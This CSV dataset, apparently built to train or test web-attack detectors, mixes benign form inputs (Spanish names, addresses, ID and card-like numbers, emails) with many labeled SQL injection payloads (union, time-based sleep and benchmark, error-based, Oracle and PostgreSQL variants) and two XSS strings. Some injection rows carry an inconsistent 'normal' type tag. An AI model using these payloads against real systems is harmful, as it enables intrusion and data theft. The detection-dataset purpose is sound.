Text,attack_type,Label,type
"1')) as kdwc where 5906=5906 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
valencina de la concepcin,norm,0,normal
73107657h,norm,0,normal
calle bernat de santa eugenia 90,norm,0,normal
maitena,norm,0,normal
5258739000426196,norm,0,normal
corua del conde,norm,0,normal
daochuan,norm,0,normal
kriz,norm,0,normal
16806738v,norm,0,normal
1%'))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'=',sqli,1,sql
cristo,norm,0,normal
dorita,norm,0,normal
"1""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((""qkat""=""qkat",sqli,1,sql
corcoy augu,norm,0,normal
horatio,norm,0,normal
"<iframe id=xss / ""onload=alert(/xss/)></iframe>",xss,2,xss
"pobla tornesa, la",norm,0,normal
graziana,norm,0,normal
barbalos,norm,0,normal
venzal tamayo,norm,0,normal
1illabarqu2,norm,0,normal
"c/ blanquers 13, 9-b",norm,0,normal
78218686x,norm,0,normal
"sant sever 63, 6-b",norm,0,normal
"1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",sqli,1,sql
9571001152380461,norm,0,normal
1%')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('%'=',sqli,1,sql
30649909v,norm,0,normal
cervantes,norm,0,normal
"1'))) or elt(6272=6272,sleep(5)) and ((('cjre'='cjre",sqli,1,normal
37115,norm,0,normal
"1%' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and '%'='",sqli,1,sql
20540,norm,0,normal
59,norm,0,normal
-7659') as bowy where 4835=4835 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
genesis,norm,0,normal
gupton,norm,0,normal
san lorenzo de la parrilla,norm,0,normal
80920943c,norm,0,normal
"1')) and elt(6847=5874,5874) and (('yspu'='yspu",sqli,1,normal
"1%"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"calle bartolome sierra, 115 7h",norm,0,normal
"-1863') or make_set(9354=9354,7185) and ('whwv'='whwv",sqli,1,normal
herling,norm,0,normal
robelo@moviels.me,norm,0,normal
"1')) as wdor where 7426=7426;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
cowper@elbauldelosrefranes.pm,norm,0,normal
azcrate campalan,norm,0,normal
"1""))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""frgb"" like ""frgb",sqli,1,sql
sobaquera,norm,0,normal
belmondo@artesania.org.ci,norm,0,normal
"1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('sqni' like 'sqni",sqli,1,normal
1%' rlike (select (case when (7689=7689) then 1 else 0x28 end)) and '%'=',sqli,1,sql
sant mart d'albars,norm,0,normal
moiss,norm,0,normal
"-1668""))) or 9323=9323#",sqli,1,normal
16471396s,norm,0,normal
mamakos@palodegolf.com.rw,norm,0,normal
"1))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"-8118"") where 3561=3561 or (8459=8459)*4906--",sqli,1,sql
"1'+(select myci where 8903=8903;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
baumgarten bagudanc,norm,0,normal
andratx,norm,0,normal
"-9054"") as rgyu where 3792=3792 order by 1--",sqli,1,sql
41992996x,norm,0,normal
25341,norm,0,normal
2214198462446690,norm,0,normal
-2452'))) union all select 1951--,sqli,1,sql
fanning_shepherd@bruoseguridad.name,norm,0,normal
michell4@so-tel.jobs,norm,0,normal
18659,norm,0,normal
"1"")) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""uzbl""=""uzbl",sqli,1,sql
hazell,norm,0,normal
10700,norm,0,normal
gros pal,norm,0,normal
1m1n7eb9rs8,norm,0,normal
castellol,norm,0,normal
"-5013'))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('ehwh' like 'ehwh",sqli,1,sql
follosas,norm,0,normal
0562626230095582,norm,0,normal
"calle poligono quintos, 37,",norm,0,normal
"1"")));select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
"-7032') as xmmm where 5635=5635 union all select 5635,5635,5635,5635,5635--",sqli,1,sql
-6244') as szpd where 8445=8445 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
"1');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ('oskf' like 'oskf",sqli,1,sql
04or2ativ1,norm,0,normal
heicy,norm,0,normal
garlitos,norm,0,normal
"-5158')) or make_set(9354=9354,7185) and (('noaj' like 'noaj",sqli,1,normal
"1')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('sqnk'='sqnk",sqli,1,sql
1')));begin user_lock.sleep(5); end and ((('hglq' like 'hglq,sqli,1,sql
"calle roncesvalls 8,",norm,0,normal
villanueva de duero,norm,0,normal
"1 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)-- zimf",sqli,1,sql
6410439898425847,norm,0,normal
"1"")) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""nobt""=""nobt",sqli,1,sql
ilijev@mauroman.tc,norm,0,normal
"1' or 8466=benchmark(5000000,md5(0x694a4745)) and 'raru'='raru",sqli,1,normal
-9522) as lraw where 9472=9472 or (4087=8213)*8213--,sqli,1,sql
"1"" where 4319=4319;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
1?i0l,norm,0,normal
guayabo,norm,0,normal
cacahuate,norm,0,normal
"1')) union all select null,null#",sqli,1,sql
0120957560122435,norm,0,normal
1269522049567133,norm,0,normal
"1"")) union all select null,null,null--",sqli,1,sql
ros,norm,0,normal
48508,norm,0,normal
cushing_borges8@sitcpla.qa,norm,0,normal
1 or sleep(5)-- nrzf,sqli,1,sql
"1"") where 3727=3727 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
bourget,norm,0,normal
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('xgzb'='xgzb",sqli,1,sql
"1%') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('%'='",sqli,1,normal
"1)) union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
-4322')) as magw where 1627=1627 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
delit@icods.ro,norm,0,normal
stinton@sms24h.dk,norm,0,normal
"-3126)) union all select 6718,6718,6718,6718,6718--",sqli,1,sql
"1""))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""hkjm"" like ""hkjm",sqli,1,sql
"1'||(select 'rawn' from dual where 4988=4988 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))||'",sqli,1,sql
"1'+(select vupb where 9575=9575 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
"1%""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""%""=""",sqli,1,sql
gaylor,norm,0,normal
navarrevisca,norm,0,normal
"1%')) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
santa eullia de ronana,norm,0,normal
meridel,norm,0,normal
03134,norm,0,normal
7791374198907519,norm,0,normal
ciolli_heesters6@zeat.es,norm,0,normal
"-7125"" or (8919=2275)*2275 and ""fbwo""=""fbwo",sqli,1,normal
"1 where 6434=6434;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1,sql
"1') and 3824=benchmark(5000000,md5(0x76555642)) and ('urxs'='urxs",sqli,1,normal
2160,norm,0,normal
03621656f,norm,0,normal
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'pnpx'='pnpx,sqli,1,sql
"-1737' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'fsmd'='fsmd",sqli,1,sql
"-4707' union all select 4414,4414,4414,4414,4414,4414#",sqli,1,sql
1'))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((('vtoi' like 'vtoi,sqli,1,sql
"1"") and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""otgh"" like ""otgh",sqli,1,sql
c9373cto2,norm,0,normal
"1)) as ctqr where 2609=2609;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
3742884361976074,norm,0,normal
latas,norm,0,normal
"-8894%"")) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""%""=""",sqli,1,sql
1');waitfor delay '0:0:5' and ('eaxu'='eaxu,sqli,1,sql
1') where 3730=3730 and sleep(5)#,sqli,1,normal
almazn cayul,norm,0,normal
bossert,norm,0,normal
egle,norm,0,normal
49893169m,norm,0,normal
"-3758')) union all select 9460,9460,9460,9460,9460,9460,9460,9460--",sqli,1,sql
26340,norm,0,normal
antanas,norm,0,normal
"1"") where 5005=5005 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",sqli,1,sql
7340868794672217,norm,0,normal
1';select pg_sleep(5)--,sqli,1,sql
36384,norm,0,normal
grigoriu matons,norm,0,normal
aguaviento,norm,0,normal
1 where 3502=3502 order by 1--,sqli,1,sql
"-3205"") union all select 5233,5233,5233,5233#",sqli,1,sql
"1'||(select 'npel' from dual where 5258=5258;select benchmark(5000000,md5(0x4c4d6142)))||'",sqli,1,sql
"1%');select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
abdn,norm,0,normal
lopez castrillon 162,norm,0,normal
cowling@minimizar.bz,norm,0,normal
bryan,norm,0,normal
tr871lat5cia,norm,0,normal
24410,norm,0,normal
regla casiano,norm,0,normal
brincones,norm,0,normal
53,norm,0,normal
vznar,norm,0,normal
26213,norm,0,normal
riumors,norm,0,normal
"-9445) as dmur where 4371=4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#",sqli,1,sql
"1%';call regexp_substring(repeat(right(char(3702),0),500000000),null) and '%'='",sqli,1,sql
9139561296743472,norm,0,normal
coxcojita,norm,0,normal
"-6789'||(select 'uckz' from dual where 2163=2163 union all select 2163,2163,2163,2163,2163,2163--",sqli,1,sql
"1%"");select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (""%""=""",sqli,1,sql
5257931647701652,norm,0,normal
"-5202 union all select 5332,5332,5332,5332,5332,5332,5332#",sqli,1,sql
calle general blake 185,norm,0,normal
58450202a,norm,0,normal
digitad$a,norm,0,normal
shakor,norm,0,normal
tenesaca chaves,norm,0,normal
"1%""))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""",sqli,1,sql
pammie,norm,0,normal
"-2149""))) or elt(1032=1032,3623) and (((""hoon"" like ""hoon",sqli,1,normal
lautaro,norm,0,normal
1190044863777145,norm,0,normal
14835707v,norm,0,normal
"1') union all select null,null,null,null,null,null,null,null--",sqli,1,sql
1'+(select qsmo where 3172=3172;select (case when (4780=4432) then 4780 else 4780*(select 4780 from mysql.db) end)#,sqli,1,sql
arana,norm,0,normal
solicitador,norm,0,normal
38i2t702,norm,0,normal
zaragoza,norm,0,normal
pesche@campodegolf.com.sy,norm,0,normal
eward,norm,0,normal
praxila,norm,0,normal
chunyen,norm,0,normal
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('pwuy'='pwuy",sqli,1,sql
towaij,norm,0,normal
carrizales oate,norm,0,normal
hatz,norm,0,normal
40979614p,norm,0,normal
pleasande@doloresmusculares.aq,norm,0,normal
"-8703') where 9723=9723 union all select 9723,9723,9723,9723,9723#",sqli,1,sql
6344938975904168,norm,0,normal
"1"")) as dooq where 7911=7911;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
-1730' or 8571=8571--,sqli,1,sql
"1'+(select 'fpnz' where 1592=1592 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))+'",sqli,1,sql
"c/ nogueira, 86 11b",norm,0,normal
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('fegp'='fegp",sqli,1,sql
"calle sol s/n,",norm,0,normal
tordelrbano,norm,0,normal
1') and sleep(5) and ('orxt'='orxt,sqli,1,normal
lladorre,norm,0,normal
mackenna.papac@interpretacion-diccionario-y-significado-de-los-s,norm,0,normal
"1"" or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",sqli,1,sql
8025245569299513,norm,0,normal
smith-ryg8@lingotes.com.br,norm,0,normal
"juan de mariana, 150,",norm,0,normal
49449729m,norm,0,normal
belver,norm,0,normal
"avenida san francisco javier, 5,",norm,0,normal
santibez de bjar,norm,0,normal
37159,norm,0,normal
lap,norm,0,normal
89388462c,norm,0,normal
brock,norm,0,normal
sigut,norm,0,normal
2589729012586382,norm,0,normal
"1%"";begin dbms_lock.sleep(5); end and ""%""=""",sqli,1,sql
"1%"")) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
8671,norm,0,normal
"1%'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('%'='",sqli,1,sql
ali,norm,0,normal
10261,norm,0,normal
chaney2@adondeir.ng,norm,0,normal
4568588143966075,norm,0,normal
"-8215%"") union all select 3877,3877,3877,3877,3877,3877--",sqli,1,sql
25560,norm,0,normal
gerald@magritte.bs,norm,0,normal
adoree-halsted1@estoespresto.af,norm,0,normal
llobet viader,norm,0,normal
trejan@carloshoya.mo,norm,0,normal
04510,norm,0,normal
"c/ universidad laboral 193,",norm,0,normal
9738066615220073,norm,0,normal
"1%"") and 8594=(select 8594 from pg_sleep(5))--",sqli,1,sql
"1""))) and 7153=7474--",sqli,1,sql
coomes@queinvento.cl,norm,0,normal
"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",sqli,1,normal
gilmartin,norm,0,normal
"virgen del mayor dolor 188, 11?a",norm,0,normal
-2717'))) or 8571=8571--,sqli,1,sql
brenna,norm,0,normal
1'+(select sijr where 7250=7250;if(1665=3845) select 1665 else drop function nzod--,sqli,1,sql
72932222g,norm,0,normal
1538,norm,0,normal
"-5560"")) or 7292=6184#",sqli,1,normal
81177297q,norm,0,normal
valdehorna,norm,0,normal
vall de ebo,norm,0,normal
calistrato,norm,0,normal
"1%') union all select null,null,null,null,null,null,null,null--",sqli,1,sql
llinas rufi,norm,0,normal
47eg0,norm,0,normal
pu128,norm,0,normal
arenas de san juan,norm,0,normal
78695182s,norm,0,normal
1) as tbve where 4828=4828;select sleep(5)#,sqli,1,sql
"1') as omtb where 1183=1183 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
hans,norm,0,normal
marlsela,norm,0,normal
rosic@faders.com.sn,norm,0,normal
lindt38,norm,0,normal
"fray bernardino de sahagun, 116 9c",norm,0,normal
robledollano,norm,0,normal
acho queralt,norm,0,normal
"calle mendoza, 7,",norm,0,normal
-3938%'))) or 2034=7209#,sqli,1,normal
ajmet,norm,0,normal
saleta,norm,0,normal
"1%""))) and elt(3114=3114,sleep(5))#",sqli,1,normal
aragons,norm,0,normal
5201712067997972,norm,0,normal
"1"") procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (""hrkf"" like ""hrkf",sqli,1,sql
+delaxar,norm,0,normal
"1%') union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
06173,norm,0,normal
fancelli joral,norm,0,normal
recordati87,norm,0,normal
8624528544448425,norm,0,normal
azmeena,norm,0,normal
nagaraja,norm,0,normal
4789967077221120,norm,0,normal
"1') as vlwh where 9403=9403 or elt(5873=5873,sleep(5))#",sqli,1,normal
"1'||(select 'frrk' from dual where 3145=3145 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))||'",sqli,1,sql
"1"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""ajuh""=""ajuh",sqli,1,sql
1) where 9167=9167;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
"1"")) or (select * from (select(sleep(5)))ydpu) and ((""imlq"" like ""imlq",sqli,1,sql
1%')) rlike sleep(5)#,sqli,1,normal
71834216h,norm,0,normal
"1') where 6772=6772 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",sqli,1,sql
mara,norm,0,normal
"-9779')) or make_set(9354=9354,7185) and (('hmzj'='hmzj",sqli,1,normal
58193627q,norm,0,normal
"data:text/html, type=image>",xss,2,normal
radunsky_oses@guejosgratis.cg,norm,0,normal
"san clemente 24,",norm,0,normal
26323,norm,0,normal
"1""))) or elt(6272=6272,sleep(5)) and (((""jref"" like ""jref",sqli,1,normal
1';select (case when (1014=4280) then 1014 else 1014*(select 1014 from mysql.db) end)#,sqli,1,sql
"1' union all select null,null,null,null#",sqli,1,sql
argentino,norm,0,normal
"1""))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (((""hbgr"" like ""hbgr",sqli,1,sql
56926815k,norm,0,normal
nuttall,norm,0,normal
6965,norm,0,normal
-9875') or (8459=8459)*4906 and ('mrxw'='mrxw,sqli,1,normal
"1') where 7541=7541;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
carricar,norm,0,normal
"1 where 5485=5485 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
